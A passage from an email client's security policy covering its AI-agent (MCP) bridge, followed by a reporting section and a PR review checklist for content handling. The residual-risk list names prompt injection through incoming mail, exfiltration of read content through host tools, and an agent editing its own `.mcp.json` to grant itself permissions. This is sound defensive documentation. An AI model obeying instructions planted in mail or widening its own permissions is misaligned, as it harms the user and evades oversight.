  Trash or in the Outbox; `send_message` accepts only drafts created by
  the same process, at the recorded version;
- no account management, no configuration, no credentials or server
  settings in any output; the socket must be the user's own 0600 socket;
  the bridge never runs as root; nothing content-bearing is logged.

Explicitly not defended: the model following instructions in mail with the
tools it has (fencing and descriptions reduce, they do not prevent);
exfiltration through the host's own tools once content is in context; the
user sending an agent-made draft without reading it; an agent editing
`.mcp.json` to grant itself flags; a sender's `Reply-To` steering a reply's
recipients, and the quoted original (its pictures, a forward's files)
travelling in an agent-made draft (both are shown in the result). A
recipient allow-list for
`send_message` built on `contact.search` is the next step and is not
implemented.

## 11. Reporting

Security issues: open a private report on the GitHub repository (Security →
Advisories) rather than a public issue. No bug bounty.

## 12. Review checklist for PRs touching content handling

- [ ] Does any path return HTML that did not pass `internal/sanitize`?
- [ ] New parser: are there malformed samples in `testdata/mime` and a
      fuzz target?
- [ ] New MIME-derived field: text-only, capped, never the raw header
      block?
- [ ] New URL handling: is the scheme allow-listed, is the real target
      shown?
- [ ] New network request: is it triggered by user action, not by content?
- [ ] New log line: can it contain a secret or message content?
- [ ] New file path accepted from the UI: validated as a regular file,
      size-capped during the copy, content type sniffed?
- [ ] Does any path store or send HTML that did not pass
      `internal/sanitize`, including outgoing drafts?
- [ ] New `finish-args` entry: is there a portal instead?
- [ ] New outbound connection: does it use `transport.TLSConfig` /
      `transport.EndpointTLSConfig` / `transport.DialContext` and classify
      errors through `transport`?
- [ ] Does anything skip certificate verification outside the pinned path
      of `transport.EndpointTLSConfig`, or let a pin reach an OAuth2,
      Graph or HTTP connection or be set without the user's confirmation
      of that certificate?
- [ ] New MCP tool or output field: is every mail-derived string cleaned
      and inside the nonce fence, is the tool behind the right flag, are
      its annotations set, and is its output capped?
